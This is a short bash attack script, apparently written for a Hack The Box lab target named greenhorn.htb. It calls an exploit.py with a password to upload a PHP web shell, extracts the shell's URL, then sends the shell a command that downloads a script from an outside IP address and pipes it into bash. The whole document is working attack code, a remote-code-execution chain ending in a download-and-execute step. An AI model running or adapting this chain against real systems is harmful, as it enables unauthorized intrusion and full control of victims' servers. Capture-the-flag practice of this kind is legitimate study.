#!/bin/bash

output=$(python3 exploit.py -u http://greenhorn.htb -p iloveyou1 -f rce.php)

url=$(echo $output | grep -oP '(?<=http://).*' | awk '{print "http://" $0}')

echo "URL: $url"

curl "$url" --data-urlencode '0=curl http://10.10.15.23:8080/index.html|bash'